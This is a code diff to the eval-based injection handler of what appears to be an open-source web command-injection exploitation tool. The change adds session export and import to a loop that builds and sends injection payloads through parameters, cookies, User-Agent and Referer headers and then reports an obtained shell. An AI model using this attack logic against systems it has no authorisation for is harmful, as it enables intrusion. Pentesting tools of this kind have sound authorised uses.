@@ -14,6 +14,7 @@ the Free Software Foundation, either version 3 of the License, or
 For more see the file 'readme/COPYING' for copying permission.
 """
 
+import os
 import re
 import sys
 import time
@@ -26,6 +27,7 @@ import urllib2
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
+from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
@@ -77,9 +79,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
   settings.EVAL_PREFIXES = settings.EVAL_PREFIXES + settings.EXECUTION_FUNCTIONS
 
   url = eb_injector.warning_detection(url, http_request_method)
-
-  sys.stdout.write(settings.INFO_SIGN + "Testing the " + technique + "... ")
-  sys.stdout.flush()
+  
+  if not settings.LOAD_SESSION:
+    sys.stdout.write(settings.INFO_SIGN + "Testing the " + technique + "... ")
+    sys.stdout.flush()
 
   i = 0
   # Calculate all possible combinations
@@ -88,110 +91,120 @@ def eb_injection_handler(url, delay, filename, http_request_method):
   for prefix in settings.EVAL_PREFIXES:
     for suffix in settings.EVAL_SUFFIXES:
       for separator in settings.EVAL_SEPARATORS:
-        i = i + 1
         
-        # Check for bad combination of prefix and separator
-        combination = prefix + separator
-        if combination in settings.JUNK_COMBINATION:
-          prefix = ""
+        # If a previous session is available.
+        if settings.LOAD_SESSION and session_handler. notification(url, technique):
+          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
+        
+        if settings.RETEST == True:
+          settings.RETEST = False
+          from src.core.injections.results_based.techniques.classic import cb_handler
+          cb_handler.exploitation(url, delay, filename, http_request_method)
+          
+        if not settings.LOAD_SESSION:
+          i = i + 1
+          # Check for bad combination of prefix and separator
+          combination = prefix + separator
+          if combination in settings.JUNK_COMBINATION:
+            prefix = ""
 
-        # Change TAG on every request to prevent false-positive results.
-        TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
+          # Change TAG on every request to prevent false-positive results.
+          TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
 
-        randv1 = random.randrange(100)
-        randv2 = random.randrange(100)
-        randvcalc = randv1 + randv2
+          randv1 = random.randrange(100)
+          randv2 = random.randrange(100)
+          randvcalc = randv1 + randv2
 
-        # Define alter shell
-        alter_shell = menu.options.alter_shell
+          # Define alter shell
+          alter_shell = menu.options.alter_shell
 
-        try:
-          if alter_shell:
-            # Classic -alter shell- decision payload (check if host is vulnerable).
-            payload = eb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
-          else:
-            # Classic decision payload (check if host is vulnerable).
-            payload = eb_payloads.decision(separator, TAG, randv1, randv2)
+          try:
+            if alter_shell:
+              # Classic -alter shell- decision payload (check if host is vulnerable).
+              payload = eb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
+            else:
+              # Classic decision payload (check if host is vulnerable).
+              payload = eb_payloads.decision(separator, TAG, randv1, randv2)
 
-          suffix = urllib.quote(suffix)
-          # Fix prefixes / suffixes
-          payload = parameters.prefixes(payload, prefix)
-          payload = parameters.suffixes(payload, suffix)
-          # Fixation for specific payload.
-          if ")%3B" + urllib.quote(")}") in payload:
-            payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))
-          payload = payload +  TAG + ""
+            suffix = urllib.quote(suffix)
+            # Fix prefixes / suffixes
+            payload = parameters.prefixes(payload, prefix)
+            payload = parameters.suffixes(payload, suffix)
+            # Fixation for specific payload.
+            if ")%3B" + urllib.quote(")}") in payload:
+              payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))
+            payload = payload +  TAG + ""
 
-          if menu.options.base64:
-            payload = urllib.unquote(payload)
-            payload = base64.b64encode(payload)
-          else:
-            payload = re.sub(" ", "%20", payload)
+            if menu.options.base64:
+              payload = urllib.unquote(payload)
+              payload = base64.b64encode(payload)
+            else:
+              payload = re.sub(" ", "%20", payload)
 
-          # Check if defined "--verbose" option.
-          if menu.options.verbose:
-            sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
+            # Check if defined "--verbose" option.
+            if menu.options.verbose:
+              sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
 
-          # Cookie Injection
-          if settings.COOKIE_INJECTION == True:
-            # Check if target host is vulnerable to cookie injection.
-            vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
-            response = eb_injector.cookie_injection_test(url, vuln_parameter, payload)
+            # Cookie Injection
+            if settings.COOKIE_INJECTION == True:
+              # Check if target host is vulnerable to cookie injection.
+              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
+              response = eb_injector.cookie_injection_test(url, vuln_parameter, payload)
 
-          # User-Agent Injection
-          elif settings.USER_AGENT_INJECTION == True:
-            # Check if target host is vulnerable to user-agent injection.
-            vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
-            response = eb_injector.user_agent_injection_test(url, vuln_parameter, payload)
+            # User-Agent Injection
+            elif settings.USER_AGENT_INJECTION == True:
+              # Check if target host is vulnerable to user-agent injection.
+              vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
+              response = eb_injector.user_agent_injection_test(url, vuln_parameter, payload)
 
-          # Referer Injection
-          elif settings.REFERER_INJECTION == True:
-            # Check if target host is vulnerable to referer injection.
-            vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
-            response = eb_injector.referer_injection_test(url, vuln_parameter, payload)
+            # Referer Injection
+            elif settings.REFERER_INJECTION == True:
+              # Check if target host is vulnerable to referer injection.
+              vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
+              response = eb_injector.referer_injection_test(url, vuln_parameter, payload)
 
-          else:
-            found_cookie_injection = False
-            # Check if target host is vulnerable.
-            response, vuln_parameter = eb_injector.injection_test(payload, http_request_method, url)
-  
-          # if need page reload
-          if menu.options.url_reload: 
-            time.sleep(delay)
-            response = urllib.urlopen(url)
-            
-          # Evaluate test results.
-          shell = eb_injector.injection_test_results(response, TAG, randvcalc)
+            else:
+              found_cookie_injection = False
+              # Check if target host is vulnerable.
+              response, vuln_parameter = eb_injector.injection_test(payload, http_request_method, url)
+    
+            # if need page reload
+            if menu.options.url_reload: 
+              time.sleep(delay)
+              response = urllib.urlopen(url)
+              
+            # Evaluate test results.
+            shell = eb_injector.injection_test_results(response, TAG, randvcalc)
 
-          if not menu.options.verbose:
-            percent = ((i*100)/total)
-            float_percent = "{0:.1f}".format(round(((i*100)/(total * 1.0)),2))
+            if not menu.options.verbose:
+              percent = ((i*100)/total)
+              float_percent = "{0:.1f}".format(round(((i*100)/(total * 1.0)),2))
 
-            if shell == False:
-              sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + float_percent + "%" + " ]")  
-              sys.stdout.flush()
+              if shell == False:
+                sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + float_percent + "%" + " ]")  
+                sys.stdout.flush()
 
-            if str(float_percent) == "100.0":
-              if no_result == True:
-                percent = Fore.RED + "FAILED" + Style.RESET_ALL
+              if str(float_percent) == "100.0":
+                if no_result == True:
+                  percent = Fore.RED + "FAILED" + Style.RESET_ALL
+                else:
+                  percent = str(float_percent)+ "%"
+              elif len(shell) != 0:
+                percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
               else:
                 percent = str(float_percent)+ "%"
-            elif len(shell) != 0:
-              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
-            else:
-              percent = str(float_percent)+ "%"
 
-            sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")  
-            sys.stdout.flush()
-            
-        except KeyboardInterrupt: 
-          raise
+              sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")  
+              sys.stdout.flush()
+              
+          except KeyboardInterrupt: 
+            raise
 
-        except SystemExit: 
-          raise
+          except SystemExit: 
+            raise
 
-        except:
-          continue
+          except:
+            continue
         
         # Yaw, got shellz! 
         # Do some magic tricks!
@@ -232,13 +245,22 @@ def eb_injection_handler(url, delay, filename, http_request_method):
             vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
           logs.update_payload(filename, counter, payload) 
           counter = counter + 1
-          
+
+          if not settings.LOAD_SESSION:
+            print ""
+
           # Print the findings to terminal.
-          print Style.BRIGHT + "\n(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+          print Style.BRIGHT + "(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
           print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
           print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
           print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
 
+          # Export session
+          if not settings.LOAD_SESSION:
+            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, delay=0, how_long=0, output_length=0, is_vulnerable="True")
+          else:
+            settings.LOAD_SESSION = False 
+            
           # Check for any enumeration options.
           if settings.ENUMERATION_DONE == True :
             while True:
